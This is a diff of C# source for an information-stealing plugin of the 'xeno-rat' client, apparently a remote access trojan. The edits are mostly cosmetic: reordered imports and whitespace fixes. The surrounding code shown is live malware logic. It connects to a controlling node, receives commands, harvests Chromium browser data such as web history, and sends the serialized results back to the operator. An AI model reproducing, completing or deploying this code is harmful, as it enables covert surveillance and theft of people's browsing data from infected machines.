@@ -1,16 +1,15 @@
-﻿using System;
+﻿using InfoGrab;
+using Org.BouncyCastle.Crypto.Engines;
+using Org.BouncyCastle.Crypto.Modes;
+using Org.BouncyCastle.Crypto.Parameters;
+using System;
 using System.Collections.Generic;
 using System.IO;
-using System.Text;
-using Org.BouncyCastle.Crypto.Parameters;
 using System.Security.Cryptography;
-using Org.BouncyCastle.Crypto.Modes;
-using Org.BouncyCastle.Crypto.Engines;
-using System.Web.Script.Serialization;
+using System.Text;
 using System.Threading.Tasks;
+using System.Web.Script.Serialization;
 using xeno_rat_client;
-using System.Runtime.Serialization.Formatters.Binary;
-using InfoGrab;
 
 namespace Plugin
 {
@@ -104,10 +103,10 @@ namespace Plugin
         {
             await node.SendAsync(new byte[] { 3 });//indicate that it has connected
             Chromium chromium = new Chromium();
-            while (node.Connected()) 
+            while (node.Connected())
             {
                 byte[] data = await node.ReceiveAsync();
-                if (data == null) 
+                if (data == null)
                 {
                     GC.Collect();
                     return;
@@ -140,8 +139,8 @@ namespace Plugin
                     List<Chromium.WebHistory> historyData = await chromium.GetWebHistory();
                     payload = SerializeWebHistoryList(historyData);
                 }
-                
-                if (payload == null) 
+
+                if (payload == null)
                 {
                     node.Disconnect();
                     return;
@@ -658,7 +657,7 @@ namespace Plugin
                 long unixExpires = (expires / 1000000) - 11644473600;
                 if (unixExpires > maxUnixTimestamp || unixExpires < minUnixTimestamp)
                 {
-                    unixExpires = maxUnixTimestamp-1;
+                    unixExpires = maxUnixTimestamp - 1;
                 }
                 this.expires = unixExpires;
             }
